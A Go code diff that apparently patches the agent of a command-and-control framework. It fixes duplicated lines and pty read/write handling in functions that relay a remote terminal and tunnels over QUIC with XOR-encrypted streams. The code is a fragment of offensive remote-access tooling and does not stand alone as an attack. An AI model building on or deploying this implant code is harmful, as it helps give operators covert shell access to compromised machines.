@@ -14,7 +14,6 @@ import (
 	"gopher/bof/coffer"
 	"gopher/functions"
 	"gopher/utils"
-	"gopher/utils"
 	"io"
 	"net"
 	"os"
@@ -1141,8 +1140,6 @@ func jobTunnel(paramsData []byte) {
 
 		go func() {
 			defer wg.Done()
-		go func() {
-			defer wg.Done()
 			if profile.Protocol == "quic" {
 				// Framed Reader for QUIC: Conn -> Client
 				for {
@@ -1165,8 +1162,6 @@ func jobTunnel(paramsData []byte) {
 			closeAll()
 		}()
 
-		go func() {
-			defer wg.Done()
 		go func() {
 			defer wg.Done()
 			if profile.Protocol == "quic" {
@@ -1231,7 +1226,6 @@ func jobTerminal(paramsData []byte) {
 			status = err.Error()
 		}
 
-		var srvConn net.Conn
 		var srvConn net.Conn
 		if profile.Protocol == "quic" {
 			tlsConf := &tls.Config{
@@ -1349,8 +1343,6 @@ func jobTerminal(paramsData []byte) {
 
 		go func() {
 			defer wg.Done()
-		go func() {
-			defer wg.Done()
 			if profile.Protocol == "quic" {
 				// Framed Reader for QUIC: Conn -> Pty
 				for {
@@ -1361,7 +1353,12 @@ func jobTerminal(paramsData []byte) {
 					if len(encData) > 0 {
 						decData := make([]byte, len(encData))
 						decStream.XORKeyStream(decData, encData)
-						_, err = ptyProc.Write(decData)
+						if rw, ok := ptyProc.(io.ReadWriter); ok {
+							_, err = rw.Write(decData)
+						} else {
+							break
+						}
+						
 						if err != nil {
 							break
 						}
@@ -1375,13 +1372,17 @@ func jobTerminal(paramsData []byte) {
 
 		go func() {
 			defer wg.Done()
-		go func() {
-			defer wg.Done()
 			if profile.Protocol == "quic" {
 				// Framed Writer for QUIC: Pty -> Conn
 				buf := make([]byte, 4096)
 				for {
-					n, err := ptyProc.Read(buf)
+					var n int
+					if rw, ok := ptyProc.(io.ReadWriter); ok {
+						n, err = rw.Read(buf)
+					} else {
+						break
+					}
+					
 					if n > 0 {
 						encData := make([]byte, n)
 						encStream.XORKeyStream(encData, buf[:n])
